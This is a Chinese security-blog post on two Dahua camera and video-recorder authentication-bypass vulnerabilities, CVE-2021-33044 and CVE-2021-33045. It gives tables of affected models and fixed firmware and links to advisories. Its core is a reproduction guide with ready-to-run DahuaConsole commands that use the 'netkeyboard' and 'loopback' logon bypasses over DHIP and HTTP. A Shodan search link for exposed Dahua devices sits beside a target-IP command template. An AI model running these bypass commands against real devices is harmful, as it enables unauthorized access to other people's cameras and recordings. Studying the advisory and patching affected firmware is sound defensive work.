<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-k34v9lDOYr3FEI_5RRp5w)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qjS1tDsz9MXiah0FPMMoAjN8bPt89dSKEBD8UrMhibiaFqiaicRVwnO9dyFNtvRn3cPGpdZLOW95gHP9ia7ooOiaJzk3Q/640?wx_fmt=jpeg)
--------------------------------------------------------------------------------------------------------------------------------------------------

大华摄像头 CVE-2021-33044-CVE-2021-33045   POC  

--------------------------------------------

CVE-2021-33044 and CVE-2021-33045.

CVE-2021-33044 范围
-----------------

<table><thead><tr><th width="87">Affected Model</th><th width="193.66666666666669">Affected Version</th><th width="193.66666666666669">Fix Software</th></tr></thead><tbody><tr><td width="87">IPC-HX3XXX, &nbsp; &nbsp; HX5XXX, &nbsp; &nbsp;HUM7XXX</td><td width="193.66666666666669">Versions which Build &nbsp; time before June,2021</td><td width="193.66666666666669">DH_IPC-HX3XXX-Leo_MultiLang_PN_Stream3_V2.800.0000000.29.R.210630 &nbsp; &nbsp;DH_IPC-HX3XXX-Leo_MultiLang_NP_Stream3_V2.800.0000000.29.R.210630 &nbsp; &nbsp;DH_IPC-HX3XXX-Dalton_MultiLang_NP_Stream3_V2.820.0000000.18.R.210705 &nbsp; &nbsp;DH_IPC-HX3XXX-Dalton_MultiLang_PN_Stream3_V2.820.0000000.18.R.210705 &nbsp; &nbsp; DH_IPC-HX5XXX-Volt_MultiLang_PN_Stream3_V2.820.0000000.5.R.210705 &nbsp; &nbsp;DH_IPC-HX5XXX-Volt_MultiLang_NP_Stream3_V2.820.0000000.5.R.210705 &nbsp; &nbsp; DH_IPC-HUM7XXX-E2-Volt_MultiLang_NP_V2.820.0000000.5.R.210705 &nbsp; &nbsp;DH_IPC-HUM7XXX-E2-Volt_MultiLang_PN_V2.820.0000000.5.R.210705</td></tr><tr><td width="87">VTO75X95X, &nbsp; &nbsp;VTO65XXX</td><td width="193.66666666666669">DH_VTO75X95X_Eng_PN_SIP_V4.300.0000003.0.R.210714 &nbsp; &nbsp;DH_VTO65XXX_Eng_PN_V4.300.0000004.0.R.210715</td><td width="193.66666666666669"><br></td></tr><tr><td width="87">VTH542XH</td><td width="193.66666666666669">DH_VTH542XH_MultiLang_SIP_V4.500.0000002.0.R.210715</td><td width="193.66666666666669"><br></td></tr><tr><td width="87">PTZ Dome Camera SD1A1, &nbsp; &nbsp;SD22, &nbsp; &nbsp;SD49, &nbsp; &nbsp; SD50, &nbsp; &nbsp; SD52C, &nbsp; &nbsp; SD6AL</td><td width="193.66666666666669">DH_SD-Eos-Civil_MultiLang_PN_Stream3_V2.812.0000007.0.R.210706 &nbsp; &nbsp;DH_SD-Eos-Civil_MultiLang_NP_Stream3_V2.812.0000007.0.R.210706 &nbsp; &nbsp;DH_SD-Eos_MultiLang_PN_Stream3_V2.812.0000007.0.R.210706 &nbsp; &nbsp;DH_SD-Eos_MultiLang_NP_Stream3_V2.812.0000007.0.R.210706</td><td width="193.66666666666669"><br></td></tr><tr><td width="111.66666666666667">Thermal &nbsp; &nbsp;TPC-BF1241, &nbsp; &nbsp; TPC-BF2221, &nbsp; &nbsp;TPC-SD2221, TPC-BF5XXX, &nbsp; &nbsp;TPC-SD8X21, &nbsp; &nbsp;TPC-PT8X21B</td><td width="193.66666666666669">DH_TPC-BF1241-TB_MultiLang_PN_V2.630.0000000.6.R.210707 &nbsp; &nbsp;DH_TPC-BF1241-TB_MultiLang_NP_V2.630.0000000.6.R.210707 &nbsp; &nbsp;DH_TPC-BF2221-TB_MultiLang_PN_V2.630.0000000.10.R.210707 &nbsp; &nbsp;DH_TPC-BF2221-TB_MultiLang_NP_V2.630.0000000.10.R.210707 &nbsp; &nbsp;DH_TPC-SD2221-TB_MultiLang_PN_V2.630.0000000.7.R.210707 &nbsp; &nbsp;DH_TPC-SD2221-TB_MultiLang_NP_V2.630.0000000.7.R.210707 &nbsp; &nbsp;DH_TPC-BF5X01-TB_MultiLang_PN_V2.630.0000000.12.R.210707 &nbsp; &nbsp;DH_TPC-BF5X01-TB_MultiLang_NP_V2.630.0000000.12.R.210707 &nbsp; &nbsp;DH_TPC-BF5X21-TB_MultiLang_PN_V2.630.0000000.8.R.210630 &nbsp; &nbsp;DH_TPC-BF5X21-TB_MultiLang_NP_V2.630.0000000.8.R.210630 &nbsp; &nbsp;DH_TPC-PT8X21A-TB_MultiLang_PN_V2.630.0000000.14.R.210630 &nbsp; &nbsp;DH_TPC-PT8X21A-TB_MultiLang_NP_V2.630.0000000.14.R.210630 &nbsp; &nbsp;DH_TPC-SD8X21-TB_MultiLang_PN_V2.630.0000000.9.R.210706 &nbsp; &nbsp;DH_TPC-SD8X21-TB_MultiLang_NP_V2.630.0000000.9.R.210706 &nbsp; &nbsp;DH_TPC-PT8X21B-B_MultiLang_PN_V2.630.0000000.10.R.210701 &nbsp; &nbsp;DH_TPC-PT8X21B-B_MultiLang_NP_V2.630.0000000.10.R.210701</td><td width="193.66666666666669"><br></td></tr></tbody></table>

CVE-2021-33045 范围
-----------------

<table><thead><tr><th width="83">Affected Model</th><th width="199.66666666666669">Affected Version</th><th width="192.66666666666669">Fix Software</th></tr></thead><tbody><tr><td width="83">IPC-HX3XXX, &nbsp; &nbsp; HX5XXX, &nbsp; &nbsp;HUM7XXX</td><td width="199.66666666666669">Versions which Build time before May,2020</td><td width="192.66666666666669">DH_IPC-HX3XXX-Leo_MultiLang_PN_Stream3_V2.800.0000000.29.R.210630 &nbsp; &nbsp;DH_IPC-HX3XXX-Leo_MultiLang_NP_Stream3_V2.800.0000000.29.R.210630 &nbsp; &nbsp;DH_IPC-HX3XXX-Dalton_MultiLang_NP_Stream3_V2.820.0000000.18.R.210705 &nbsp; &nbsp;DH_IPC-HX3XXX-Dalton_MultiLang_PN_Stream3_V2.820.0000000.18.R.210705 &nbsp; &nbsp; DH_IPC-HX5XXX-Volt_MultiLang_PN_Stream3_V2.820.0000000.5.R.210705 &nbsp; &nbsp;DH_IPC-HX5XXX-Volt_MultiLang_NP_Stream3_V2.820.0000000.5.R.210705 &nbsp; &nbsp;DH_IPC-HUM7XXX-E2-Volt_MultiLang_NP_V2.820.0000000.5.R.210705 &nbsp; &nbsp;DH_IPC-HUM7XXX-E2-Volt_MultiLang_PN_V2.820.0000000.5.R.210705</td></tr><tr><td width="83">VTO75X95X, &nbsp; &nbsp;VTO65XXX</td><td width="199.66666666666669">Versions which Build time before December,2019</td><td width="192.66666666666669">DH_VTO75X95X_Eng_PN_SIP_V4.300.0000003.0.R.210714 &nbsp; &nbsp;DH_VTO65XXX_Eng_PN_V4.300.0000004.0.R.210715</td></tr><tr><td width="83">VTH542XH</td><td width="199.66666666666669">DH_VTH542XH_MultiLang_SIP_V4.500.0000002.0.R.210715</td><td width="192.66666666666669"><br></td></tr><tr><td width="107.66666666666667">NVR1XXX, &nbsp; &nbsp;NVR2XXX, &nbsp; &nbsp;NVR4XXX, &nbsp; &nbsp;NVR5XXX, &nbsp; &nbsp;NVR6XX</td><td width="199.66666666666669">DH_NVR4XXX-I_MultiLang_V4.001.0000000.3.R.210710 &nbsp; &nbsp; DH_NVR4x-4KS2L_MultiLang_V4.001.0000001.0.R.210709 &nbsp; &nbsp;DH_NVR4XXX-4KS2_MultiLang_V4.001.0000005.1.R.210713 &nbsp; &nbsp;DH_NVR5XXX-4KS2_MultiLang_V4.001.0000006.1.R.210709 &nbsp; &nbsp;DH_NVR5XXX-I_MultiLang_V4.001.0000000.3.R.210710 &nbsp; &nbsp;DH_NVR5XXX-IL_MultiLang_V4.001.0000000.0.R.210710 &nbsp; &nbsp;DH_NVR1XHC-S3_MultiLang_V4.001.0000000.1.R.210710 &nbsp; &nbsp;DH_NVR2XXX-4KS2_MultiLang_V4.001.0000005.0.R.210709 &nbsp; &nbsp;DH_NVR2XXX-W-4KS2_MultiLang_V4.001.0000003.1.R.210709 &nbsp; &nbsp;DH_NVR2XXX-I2_Mul_V4.002.0000000.0.R.210709 &nbsp; &nbsp;DH_NVR2XXX-I_Mul_V4.001.0000000.1.R.210710 &nbsp; &nbsp;DH_NVR1XXX-S3H_MultiLang_V4.001.0000005.1.R.210709 &nbsp; &nbsp;DH_NVR6XX-4KS2_MultiLang_V4.001.0000001.1.R.210716</td><td width="192.66666666666669"><br></td></tr><tr><td width="83">XVR4xxx, &nbsp; &nbsp;XVR5xxx, &nbsp; &nbsp;XVR7xxx</td><td width="199.66666666666669">DH_XVR5x16-I2_MultiLang_V4.001.0000003.1.R.210710 &nbsp; &nbsp;DH_XVR7x16-I2_MultiLang_V4.001.0000003.1.R.210710 &nbsp; &nbsp;DH_XVR5x08-I2_MultiLang_V4.001.0000003.1.R.210710 &nbsp; &nbsp;DH_XVR5x04-I2_MultiLang_V4.001.0000003.1.R.210710 &nbsp; &nbsp;DH_XVR7x32-I2_MultiLang_V4.001.0000003.1.R.210710 &nbsp; &nbsp;DH_XVR5x08-I3_MultiLang_V4.001.0000000.15.R.210702 &nbsp; &nbsp;DH_XVR5x04-I3_MultiLang_V4.001.0000000.15.R.210702 &nbsp; &nbsp;DH_XVR4x08-I3_MultiLang_V4.001.0000000.15.R.210702 &nbsp; &nbsp;DH_XVR4x04-I_MultiLang_V4.001.0000001.1.R.210709 &nbsp; &nbsp;DH_XVR4x08-I_MultiLang_V4.001.0000001.1.R.210709 &nbsp; &nbsp; DH_XVR5x08-X_MultiLang_V4.001.0000000.9.R.210710 &nbsp; &nbsp;DH_XVR5x16-X_MultiLang_V4.001.0000000.9.R.210710 &nbsp; &nbsp;DH_XVR7x16-X_MultiLang_V4.001.0000000.9.R.210710 &nbsp; &nbsp;DH_XVR5x04-X1(2.0)_MultiLang_V4.001.0000000.14.R.210709 &nbsp; &nbsp;DH_XVR4x04-X1(2.0)_MultiLang_V4.001.0000000.14.R.210709</td><td width="192.66666666666669"><br></td></tr></tbody></table>

https://securityaffairs.co/wordpress/123076/hacking/dahua-cameras-flaws.html

https://www.bleepingcomputer.com/news/security/unpatched-dahua-cams-vulnerable-to-unauthenticated-remote-access

https://github.com/mcw0/DahuaConsole

https://www.dahuasecurity.com/support/cybersecurity/details/957

poc
---

https://github.com/mcw0/DahuaConsole

复现：
---

```
pip3 install -r requirements.txt
```

```
[CVE-2021-33044]Protocol needed: DHIP or HTTP/HTTPS (DHIP do not work with TLS/SSL @TCP/443)[proto: dhip, normally using tcp/5000]./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto dhip --rport 5000[proto: dhip, usually working with HTTP port as well]./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto dhip --rport 80[proto: http/https]./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto http --rport 80./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto https --rport 443
```

```
[CVE-2021-33045]Protocol needed: DHIP (DHIP do not work with TLS/SSL @TCP/443)[proto: dhip, normally using tcp/5000]./Console.py --logon loopback --rhost 192.168.57.20 --proto dhip --rport 5000[proto: dhip, usually working with HTTP port as well]./Console.py --logon loopback --rhost 192.168.57.20 --proto dhip --rport 80
```

漏洞细节
----

```
https://github.com/mcw0/PoC/blob/master/Dahua%20authentication%20bypass.txt
```

复现成功截图：
-------

https://www.shodan.io/search?query=Dahua

```
python3 ./Console.py --logon loopback --rhost ip --proto dhip --rport 5000
```

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MXiah0FPMMoAjN8bPt89dSKEwmgI3PficsDlOTqjG3olUBCcIicO1MCFmFAnrkKibO8XMy58icT1vDia1LQ/640?wx_fmt=png)

1633969651035

公众号

往期文章 [Apache 任意文件读取补丁绕过（CVE-2021-42013）](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247485088&idx=1&sn=c89fb872dc89985303a41606c5020880&chksm=e9aa1b62dedd9274b8a528bb4fabe6fec178fc28d68feb79d3ea62c758df73ac07cb6212e050&scene=21#wechat_redirect)[漏洞描述 | CVE-2021-31166  POC](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247485049&idx=2&sn=9ab8fe669683d769138e72c34a366dea&chksm=e9aa1bbbdedd92ad6a4221b696eb3082b8690f79abe95c33308b6568bdfa359939044cc135aa&scene=21#wechat_redirect)  
[新洞速递（CVE-2021-41773）](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247485040&idx=1&sn=7c508f7988d1938dd5a6d3adb5334cb1&chksm=e9aa1bb2dedd92a411bb6303fb870784d6b775ecf6b5f12ba70c87e6f931177fe4387e4b33b7&scene=21#wechat_redirect)  
[接上一篇 CVE-2021-40444 CS 上线](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247485011&idx=1&sn=ce9b6a30fac3cab226d14fd42634811e&chksm=e9aa1b91dedd928704096e2ec63c5b0ced8c28b1a05a7a9a1874bf41b2484bfd5132ae6b0f99&scene=21#wechat_redirect)  
[CVE-2020-0787 Windows 全版本 本地提权](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247484996&idx=1&sn=a1e44a4592195447dd97bb8d06ab6c81&chksm=e9aa1b86dedd929021fd9520613f477741feac3a98bf9651fd5e686c75232114e7794e576631&scene=21#wechat_redirect)  
[锐捷 RG-UAC 统一上网行为管理审计系统漏洞](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247484950&idx=1&sn=c4d4fa9a5d135274cadf36993af144e8&chksm=e9aa1bd4dedd92c28e76be72bfacde1f1b0663497e0ddf247145bbbd7418e04b9c1977198a5c&scene=21#wechat_redirect)  
[和信下一代云桌面远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247484933&idx=1&sn=07a1d312b29f894649dae919306558df&chksm=e9aa1bc7dedd92d1f6e542ed2be57290d00149ad02ec1d37a81a31a9611c100730597960c720&scene=21#wechat_redirect)  
[Linux 本地提权漏洞 CVE-2021-3493](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247484923&idx=1&sn=54689e0416adc95b36fd3054ab9b96ea&chksm=e9aa1839dedd912fbf25dd9b8cacd98e1fbfb77674f4c6ca14f42d664d0c19c6c10386ec9b72&scene=21#wechat_redirect)  
[CVE-2019-19781 Citrix ADC 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&mid=2247484743&idx=1&sn=9c551cb5545c57a3b14aee51068570a2&chksm=e9aa1885dedd9193ab4f03304926e6e87021735512384b005c05bb25d12e279a6d6dfaaaa48b&scene=21#wechat_redirect)